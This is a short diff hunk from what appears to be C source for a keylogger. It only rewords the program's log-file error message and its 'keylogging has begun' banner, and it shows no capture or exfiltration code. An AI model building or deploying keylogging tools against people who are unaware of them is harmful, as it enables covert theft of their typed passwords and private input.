@@ -31,11 +31,11 @@ int main(int argc, const char *argv[]) {
     logfile = fopen(logfileLocation, "a");
 
     if (!logfile) {
-        fprintf(stderr, "ERROR: Unable to open log file. Ensure that you have the proper permissions.\n");
+        fprintf(stderr, "ERROR: Unable to access keystroke log file. Please make sure you have the correct permissions.\n");
         exit(1);
     }
 
-    fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
+    fprintf(logfile, "\n\nKeystrokes are now being recorded\n%s\n", asctime(localtime(&result)));
     fflush(logfile);
 
     printf("Logging to: %s\n", logfileLocation);
